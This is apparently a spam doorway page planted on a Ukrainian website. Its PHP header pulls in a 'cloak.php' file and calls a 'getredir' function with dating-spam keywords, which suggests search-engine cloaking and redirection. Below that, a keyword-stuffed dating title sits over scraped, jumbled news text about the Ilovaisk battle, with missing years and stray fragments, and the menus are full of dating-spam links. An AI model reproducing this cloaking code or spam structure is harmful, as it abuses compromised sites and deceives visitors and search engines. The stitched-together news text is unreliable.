<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d0%b1%d0%b5%d0%b7%d0%ba%d0%be%d1%88%d1%82%d0%be%d0%b2%d0%bd%d1%96+%d1%81%d0%b0%d0%b9%d1%82%d0%b8+%d0%bb%d0%b5%d1%81%d0%b1%d1%96%d1%8f%d0%bd%d0%be%d0%ba+-+%d0%86%d0%bb%d0%be%d0%b2%d0%b0%d0%b9%d1%81%d1%8c%d0%ba+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>У Офісі генпрокурора назвали єдину причину Іловайської трагедії</title>
	<meta name="description" content="المدة: " />
	<link rel="canonical" href="https://masage.od.ua/img/137/bafi-bezkoshtovn-sayti-lesbyanok.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/377/cas-eksklyuzivne-agentstvo-znayomstv.php">ексклюзивне агентство знайомств в Жовква Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/468/gocy-tse.php">- це нові чорні побачення поблизу Любомль Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/428/sare-shvidksn-pobachennya.php">швидкісні побачення пятниця в Голубівка Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Безкоштовні сайти лесбіянок - Іловайськ Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>Кляті питання ". Приєднуйтесь до нашого каналу на YouTube! Теми: Іловайськ Генпрокуратура. powered by lun.</p>
		
			<br><ul>
			
				<li>Бої за Іловайськ — Вікіпедія?</li>
			
				<li>пошук виконавчих знайомств Тальне Україна;</li>
			
				<li>підключити сайти в Кривий Ріг Україна.</li>
			
				<li>сайт знайомств місто Здолбунів Україна.</li>
			
				<li>це нове чорне побачення Звенигородка Україна?</li>
			
				<li>витрати на сватання в Антрацит Україна;</li>
			
			</ul>
		
	<p>Головне сьогодні. Помер посол України в Китаї. Росіяни влаштували флешмоб із ліхтариками на підтримку Навального. ДБР розслідує загибель трьох військових на Донбасі. Підозрюваного у вбивстві Окуєвої відпустили під домашній арешт.</p><img src="https://upload.wikimedia.org/wikipedia/uk/c/cd/Ilovaisk_2014_-_Batalion_Donbas_(UKR_poster,_2019).jpg" alt="" style="max-width: 480px; max-height: 480px;"/><p>Зеленський відреагував на загибель військових на Донбасі. Прикордонники розповіли, хто міг полетіти в ОАЕ на літаку Козака. Усі новини До суду скеровано 48 обвинувальних актів стосовно 51 особи.</p>
		
	<p>Вироками українських судів 35 осіб вже засуджено, в тому числі 13 громадян РФ, серед них 3 військовослужбовці ЗС РФ. До Офісу прокурора Міжнародного кримінального суду для вирішення питання про відкриття кримінального провадження передано інформацію про зібрані докази вчинення воєнних злочинів, в тому числі віроломного вбивства українських військових у районі Іловайська. Слідчі Головного слідчого управління Служби безпеки України продовжують збір доказів та встановлення всіх винних осіб.</p>
<p>A A A Звичайна версія сайту. офіс генерального прокурора. Людям із порушенням зору EN. Про прокуратуру. Бюджетна звітність.</p>
		
	<p>Звернення громадян. Про корупцію та інші зловживання. Тому що вони за це грошей не отримують", - казав у грудні року Володимир Путін. За даними Головної військової прокуратури, під Іловайськом загинуло українських бійців. Такі ж цифри нещодавно озвучив ексначальник Генштабу Віктор Муженко в інтерв'ю "Радіо Свобода": " загиблих, із них зі Збройних сил, інші - з добровольчих батальйонів". З урахуванням зниклих безвісти ця цифра може бути більшою. У відповідь на запит BBC News Україна Генштаб повідомив, що до цього часу вважаються зниклими безвісти під час виходу з Іловайська 22 військових, які зникли сюди ж входять й ідентифіковані військові, чиї рідні відмовляються вірити у їхню смерть та визнавати дані ДНК-експертизи.</p>
<p>Крім того, 13 українських військових, за даними Генштабу, які потрапили у полон під Іловайськом, досі утримуються у заручниках. Нарешті, цифра загиблих не враховує тих, хто помер пізніше від поранень.</p>
		
	<p>У році в українському Генштабі озвучили і ймовірні втрати російської армії. Але низка оглядачів сумнівається у такій цифрі і вважає її завищеною. Ще у році військова прокуратура повідомила , що за її розслідуванням, головною причиною втрат сил АТО під Іловайськом стало "вторгнення підрозділів Збройних сил РФ". Іншими факторами, які вплинули на ситуацію, були низька боєздатність ЗСУ, дезертирство та "окремі помилки керівництва АТО під час планування та проведення військових операцій".</p>
<p>Проте з того часу розслідування так і не завершилося, а його хід залишається засекреченим. Наприклад, не оголошували, які свідчення щодо Іловайська дали ексначальник Генштабу Віктор Муженко та його наступник Руслан Хомчак , який у серпні року сам брав участь у тих боях і давав наказ на вихід колон. Така ситуація викликає нерозуміння у ветеранів.</p>
<p>Якщо винна лише РФ, то чому справу не передати до суду?</p><a id='z1'></a><h3>Звичайна операція</h3><p>Нехай керівники поставлять крапку - яка ступінь провини кожного. Якщо винні олігархи, які нібито підрядили нас, добровольців захоплювати якісь об'єкти - нехай їх покарають. Якщо винне керівництво Генштабу - нехай дадуть оцінку їхнім діям. Якщо вище політичне керівництво держави - нехай покажуть їхні дії", - наполягає Роман Зіненко.</p>
<p>Сам він написав дві книги - "Іловайський щоденник" та "Війна, якої не було" - де зібрані спогади десятків бійців АТО. Тепер я чекаю такий самий звіт від керівників держави і Генштабу", - закликає Роман Зіненко. За його словами, відкрите розслідування щодо Іловайська допоможе багатьом ветеранам нарешті "повернутися" звідти.</p>
<p>Для мене нічого не забулося, не стало легше, я досі живу "там".</p><strong><a id='z2'></a><h2>- Новини - Офіс Генерального прокурора</h2></strong><p>Якась частина моєї душі залишилася в Іловайську", - каже Роман. Хочете отримувати найважливіші новини в месенджер? Підписуйтеся на наш Telegram або Viber! Спогади про серпень року. В'ячеслав Шрамович BBC News Україна. Підпис до фото, Роман Зіненко - автор двох книг, де зібрані спогади кількох десятків бійців АТО про бої під Іловайськом. Була б ще сотня людей, взяли б Іловайськ - спогади бійця Що сталося в Іловайську: версія Генштабу "Зеленський на першій зустрічі одразу спитав мене про Іловайськ" - Хомчак. Звичайна операція. Підпис до фото, "Дніпро-1" перед заходом в Іловайськ.</p>
<p>Підпис до фото, Роман Зіненко в Іловайську. Підпис до фото, Сергій Міщенко знизу. Все змінилося після 24 серпня. Підпис до фото, Бійці АТО у школі в Іловайську скріншот з відео. Підпис до фото, Ранок 29 серпня року. Підпис до фото, Одна з колон сил АТО рухається біля соняшникового поля за селом Многопілля.</p><a id='z3'></a><h3>Навігаційне меню</h3><p>Підпис до фото, Позиції проросійських сил біля Іловайська. Скріншот з відео Андрія Тетерука. Як гинули у "зеленому коридорі". Підпис до фото, Залишки техніки під Іловайськом. Підпис до фото, Так тіло бійця знімали ремонтники через два тижні після "зеленого коридору". Підпис до фото, Роман Зіненко і Денис Томілович.</p>
<p>Підпис до фото, Розслідування Forensic Architecture. Підпис до фото, МТЛБ з маркером у вигляді білого круга. Підпис до фото, Вадим Якушенко пробув у полоні "ДНР" чотири місяці. Підпис до фото, Роман Зіненко дивиться на портрети загиблих бійців у Музеї АТО в Дніпрі. Зниклий під Іловайськом: мати роками шукає сина Скільки українська армія втратила в Іловайську? Нові дані Генштабу. Підпис до фото, Роман Зіненко каже.</p>
<p>що частина його душі до цього часу в Іловайську. Була б ще сотня людей, взяли б Іловайськ - спогади бійця 14 серпня  На Донбасі загинули троє військових.</p><strong><a id='z4'></a><h2>Іловайський котел</h2></strong><p>Відомий фізик стверджує, що час плине у двох напрямках. Як ця ідея змінює погляд на Всесвіт 6 годин и тому. У Нідерландах морози викликали бум катання на ковзанах. Фото 6 годин и тому. Сенату США не вистачило голосів, щоб засудити Трампа. Що це означає для Америки 14 лютого</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/398/lyzyr-znayomstva-pod-lyudini.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/106/wicy-top-dodatok-dlya.php">Топ додаток для знайомств в Бориспіль Україна</a></li><li><a href="https://masage.od.ua/img/471/fydu-znayomstva-dlya.php">знайомства для одинаків Херсон Україна</a></li><li><a href="https://masage.od.ua/img/471/kil-znayomstva-shvidkst.php">знайомства швидкість знайомства в Волочиськ Україна</a></li><li><a href="https://masage.od.ua/img/361/lonor-agentsya-bezkoshtovnih-znayomstv.php">агенція безкоштовних знайомств Глухів Україна</a></li><li><a href="https://masage.od.ua/img/248/lyso-znayomstva-z.php">знайомства з дівчатами в Ічня Україна</a></li><li><a href="https://masage.od.ua/img/137/kuzy-krashiy-dodatok-pdklyuchennya.php">кращий додаток підключення в Мерефа Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Contents</h2>
				<ol><li><a href='#z1'>Звичайна операція</a></li>
<li><a href='#z2'>- Новини - Офіс Генерального прокурора</a></li>
<li><a href='#z3'>Навігаційне меню</a></li>
<li><a href='#z4'>Іловайський котел</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/352/pol-posluga-znayomstv.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>